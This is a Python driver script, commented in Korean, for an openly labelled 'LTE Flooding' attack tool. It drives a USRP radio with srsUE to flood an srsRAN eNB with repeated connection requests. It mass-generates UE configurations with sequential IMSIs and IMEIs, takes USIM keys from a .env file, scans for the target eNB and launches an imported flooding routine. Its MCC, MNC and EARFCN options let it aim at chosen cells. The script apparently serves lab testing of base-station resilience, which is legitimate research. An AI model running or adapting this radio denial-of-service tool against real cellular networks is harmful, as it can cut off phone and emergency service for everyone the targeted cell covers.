#!/usr/bin/env python3
"""
LTE Flooding Script - Main
USRP 장치를 사용하여 srsRAN eNB에 연결 요청을 반복적으로 전송합니다.
"""

import subprocess
import time
import signal
import sys
import os
import re
import shutil
from typing import Optional
import argparse
import logging
from pathlib import Path

from enb_scout import find_enb, get_config_files, get_config_values
from flooding_attack import run_flooding_attack

# 로깅 설정
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)


class ConfigGenerator:
    """Config 파일 생성 클래스"""
    
    def __init__(self, mcc: Optional[int] = None, mnc: Optional[int] = None, 
                 earfcn: Optional[int] = None):
        self.mcc = mcc
        self.mnc = mnc
        self.earfcn = earfcn
        self.usim_opc, self.usim_k = self._load_usim_keys()
    
    def _load_usim_keys(self) -> tuple[str, str]:
        """환경변수 또는 .env 파일에서 USIM 키 로드"""
        opc = os.getenv('USIM_OPC')
        k = os.getenv('USIM_K')
        
        env_file = Path('.env')
        if env_file.exists():
            with open(env_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('#') or not line:
                        continue
                    if '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        if key == 'USIM_OPC' and not opc:
                            opc = value
                        elif key == 'USIM_K' and not k:
                            k = value
        
        if not opc or not k:
            logger.error("USIM 키를 찾을 수 없습니다. .env 파일 또는 환경변수(USIM_OPC, USIM_K)를 설정하세요.")
            raise ValueError("USIM 키가 설정되지 않았습니다.")
        
        return opc, k
    
    def generate_configs_batch(self, count: int = 500, output_dir: str = "ue_configs"):
        """대량의 config 파일을 미리 생성"""
        # 기존 폴더가 있으면 비우기
        if os.path.exists(output_dir):
            logger.info(f"{output_dir} 폴더를 비우는 중...")
            try:
                shutil.rmtree(output_dir)
            except Exception as e:
                logger.error(f"폴더 삭제 오류: {e}")
        
        # 폴더 생성
        os.makedirs(output_dir, exist_ok=True)
        
        logger.info(f"{count}개의 config 파일을 {output_dir} 폴더에 생성 중...")
        
        for i in range(1, count + 1):
            config_path = self._create_ue_config_in_dir(i, output_dir)
            if i % 50 == 0:
                logger.info(f"진행 중... {i}/{count} 생성 완료")
        
        logger.info(f"✓ {count}개의 config 파일 생성 완료: {output_dir}/")
    
    def _create_ue_config_in_dir(self, unique_id: int, output_dir: str) -> str:
        """지정된 디렉토리에 config 파일 생성"""
        # EARFCN 설정
        if self.earfcn is not None:
            earfcn_line = f"dl_earfcn = {self.earfcn}"
        elif (self.mcc is not None or self.mnc is not None):
            earfcn_line = "# dl_earfcn =  # 자동 스캔 (MCC/MNC 지정됨)"
        else:
            earfcn_line = f"dl_earfcn = 3400"
        
        # IMSI 생성
        if self.mcc is not None and self.mnc is not None:
            mnc_digits = 3 if self.mnc >= 100 else 2
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"{self.mcc:03d}{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        elif self.mcc is not None:
            imsi = f"{self.mcc:03d}01{unique_id:010d}"
        elif self.mnc is not None:
            mnc_digits = 3 if self.mnc >= 100 else 2
            mcc_mnc_len = 3 + mnc_digits
            msin_len = 15 - mcc_mnc_len
            imsi = f"001{self.mnc:0{mnc_digits}d}{unique_id:0{msin_len}d}"
        else:
            imsi = f"00101{unique_id:010d}"
        
        # IMEI 포맷팅 (15자리)
        imei_suffix = f"{unique_id:06d}"
        imei = f"35349006{imei_suffix}0"  # 총 15자리
        
        config_content = f"""[rf]
freq_offset = 0
tx_gain = 70
rx_gain = 40

[rat.eutra]
{earfcn_line}

[pcap]
enable = none
mac_filename = /tmp/srsue_{unique_id}_mac.pcap
mac_nr_filename = /tmp/srsue_{unique_id}_mac_nr.pcap
nas_filename = /tmp/srsue_{unique_id}_nas.pcap

[log]
all_level = warning
phy_lib_level = none
all_hex_limit = 32
filename = /tmp/srsue_{unique_id}.log
file_max_size = -1

[usim]
mode = soft
algo = milenage
opc  = {self.usim_opc}
k    = {self.usim_k}
imsi = {imsi}
imei = {imei}

[rrc]
#ue_category       = 4
#release           = 8
#feature_group     = 0xe6041000
#mbms_service_id   = -1
#mbms_service_port = 4321

[gui]
enable = false
"""
        config_path = os.path.join(output_dir, f"srsue_{unique_id}.conf")
        with open(config_path, 'w') as f:
            f.write(config_content)
        return config_path


def check_usrp_connection(usrp_args: Optional[str] = None) -> bool:
    """USRP 장치 연결 확인"""
    logger.info("USRP 장치 연결 확인 중...")
    
    try:
        result = subprocess.run(
            ["uhd_find_devices"],
            capture_output=True,
            text=True,
            timeout=5
        )
        
        serial_match = re.search(r'serial:\s*([^\s,]+)', result.stdout + result.stderr)
        if serial_match:
            found_serial = serial_match.group(1)
            user_serial = None
            if usrp_args:
                user_serial_match = re.search(r'serial=([^\s"]+)', usrp_args)
                user_serial = user_serial_match.group(1) if user_serial_match else None
            
            if user_serial and found_serial.upper() == user_serial.upper():
                logger.info(f"✓ USRP 장치 연결 확인됨: serial={found_serial}")
                return True
            elif user_serial:
                logger.warning(f"지정한 시리얼({user_serial})과 발견된 시리얼({found_serial})이 다릅니다")
                logger.info(f"발견된 장치 사용: serial={found_serial}")
                return True
            else:
                logger.info(f"✓ USRP 장치 발견: serial={found_serial}")
                return True
        
        return True
    except Exception as e:
        logger.warning(f"USRP 확인 중 오류: {e}")
        return False


class LTEFlooder:
    """LTE Flooding 메인 클래스"""
    
    def __init__(self, usrp_args: Optional[str] = None, mcc: Optional[int] = None,
                 mnc: Optional[int] = None, earfcn: Optional[int] = None,
                 template_config: Optional[str] = None, max_ue_count: int = 500):
        self.usrp_args = usrp_args
        self.mcc = mcc
        self.mnc = mnc
        self.earfcn = earfcn
        self.template_config = template_config or "ue_template.conf"
        self.max_ue_count = max_ue_count
        self.usim_opc, self.usim_k = self._load_usim_keys()
        self.running = False
    
    def _load_usim_keys(self) -> tuple[str, str]:
        """환경변수 또는 .env 파일에서 USIM 키 로드"""
        opc = os.getenv('USIM_OPC')
        k = os.getenv('USIM_K')
        
        env_file = Path('.env')
        if env_file.exists():
            with open(env_file, 'r') as f:
                for line in f:
                    line = line.strip()
                    if line.startswith('#') or not line:
                        continue
                    if '=' in line:
                        key, value = line.split('=', 1)
                        key = key.strip()
                        value = value.strip()
                        if key == 'USIM_OPC' and not opc:
                            opc = value
                        elif key == 'USIM_K' and not k:
                            k = value
        
        if not opc or not k:
            logger.error("USIM 키를 찾을 수 없습니다. .env 파일 또는 환경변수(USIM_OPC, USIM_K)를 설정하세요.")
            raise ValueError("USIM 키가 설정되지 않았습니다.")
        
        return opc, k
    
    def start(self):
        """Flooding 시작"""
        if self.running:
            logger.warning("이미 실행 중입니다.")
            return
        
        self.running = True
        
        # 템플릿 config 파일 확인
        if not os.path.exists(self.template_config):
            logger.error(f"템플릿 config 파일을 찾을 수 없습니다: {self.template_config}")
            logger.info("템플릿 config 파일을 생성하거나 경로를 확인하세요.")
            return
        
        # 로그 출력
        target_info = []
        if self.earfcn is not None:
            target_info.append(f"주파수: EARFCN {self.earfcn}")
        if self.mcc is not None:
            target_info.append(f"MCC: {self.mcc}")
        if self.mnc is not None:
            target_info.append(f"MNC: {self.mnc}")
        target_str = ", ".join(target_info) if target_info else "기본 설정"
        logger.info(f"설정: {target_str}")
        logger.info(f"템플릿 config: {self.template_config}")
        logger.info(f"UE ID는 1부터 계속 증가합니다 (순환 없음)")
        
        if self.usrp_args:
            logger.info(f"USRP 인자: {self.usrp_args}")
        else:
            logger.info("USRP 인자가 지정되지 않았습니다. 기본 장치 사용")
        
        # USRP 연결 확인
        if not check_usrp_connection(self.usrp_args):
            logger.error("USRP 장치 연결을 확인할 수 없습니다.")
            raise RuntimeError("USRP 장치 연결 실패")
        
        # eNB 찾기 (템플릿 config 사용)
        enb_found = find_enb(self.template_config, self.usrp_args)
        
        if not enb_found:
            logger.warning("eNB를 찾지 못했습니다. 재시도합니다...")
            if self.running:
                time.sleep(1)
                self.start()
            return
        
        # 공격 시작
        run_flooding_attack(
            self.template_config, self.usrp_args, lambda: self.running,
            mcc=self.mcc, mnc=self.mnc, earfcn=self.earfcn,
            usim_opc=self.usim_opc, usim_k=self.usim_k,
            max_ue_count=self.max_ue_count
        )
    
    def stop(self):
        """Flooding 중지"""
        if not self.running:
            return
        
        logger.info("LTE Flooding 중지 중...")
        self.running = False
        
        # 모든 srsue 프로세스 종료
        try:
            subprocess.run(["pkill", "-9", "srsue"], timeout=5)
        except:
            pass
        
        logger.info("LTE Flooding이 중지되었습니다.")


def main():
    parser = argparse.ArgumentParser(
        description="LTE Flooding - USRP를 사용하여 srsRAN eNB에 연결 요청을 반복 전송"
    )
    parser.add_argument(
        "--usrp-args",
        type=str,
        default=None,
        help="USRP 장치 인자 (예: serial=30AD123 또는 type=b200)"
    )
    parser.add_argument(
        "--mcc",
        type=int,
        default=None,
        help="Mobile Country Code (예: 123)"
    )
    parser.add_argument(
        "--mnc",
        type=int,
        default=None,
        help="Mobile Network Code (예: 456)"
    )
    parser.add_argument(
        "--earfcn",
        type=int,
        default=None,
        help="주파수 채널 번호 (EARFCN)"
    )
    parser.add_argument(
        "--generate-configs",
        type=int,
        default=None,
        metavar="N",
        help="N개의 config 파일을 미리 생성하고 종료합니다 (예: --generate-configs 500)"
    )
    parser.add_argument(
        "--config-dir",
        type=str,
        default="ue_configs",
        help="생성된 config 파일을 저장할 디렉토리 (기본값: ue_configs)"
    )
    parser.add_argument(
        "--template-config",
        type=str,
        default="ue_template.conf",
        help="템플릿 UE config 파일 경로 (기본값: ue_template.conf)"
    )
    parser.add_argument(
        "--max-ue-count",
        type=int,
        default=500,
        metavar="N",
        help="[사용 안 함] 하위 호환성 유지용 (UE ID는 계속 증가)"
    )
    parser.add_argument(
        "--use-configs",
        action="store_true",
        help="[구식] ue_configs 폴더의 모든 config 파일을 사용합니다 (템플릿 방식 권장)"
    )
    
    args = parser.parse_args()
    
    # Config 파일 생성 모드 (하위 호환성 유지)
    if args.generate_configs:
        generator = ConfigGenerator(mcc=args.mcc, mnc=args.mnc, earfcn=args.earfcn)
        generator.generate_configs_batch(args.generate_configs, args.config_dir)
        logger.info(f"생성 완료! {args.generate_configs}개의 config 파일이 {args.config_dir}에 생성되었습니다.")
        return
    
    # Flooding 모드
    if args.use_configs:
        logger.warning("--use-configs 옵션은 구식 방식입니다. 템플릿 config 방식을 권장합니다.")
        # 기존 방식으로 동작 (하위 호환성)
        config_files = get_config_files()
        if not config_files:
            logger.error("ue_configs 폴더에 config 파일이 없습니다!")
            return
        # ... 기존 코드 ...
        return
    
    # 템플릿 config 방식 (새로운 방식)
    flooder = LTEFlooder(
        usrp_args=args.usrp_args,
        mcc=args.mcc,
        mnc=args.mnc,
        earfcn=args.earfcn,
        template_config=args.template_config,
        max_ue_count=args.max_ue_count
    )
    
    # 시그널 핸들러 설정
    def signal_handler(sig, frame):
        logger.info("\n종료 신호 수신...")
        flooder.stop()
        sys.exit(0)
    
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)
    
    try:
        flooder.start()
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        logger.info("\n사용자에 의해 중지됨")
    finally:
        flooder.stop()


if __name__ == "__main__":
    main()
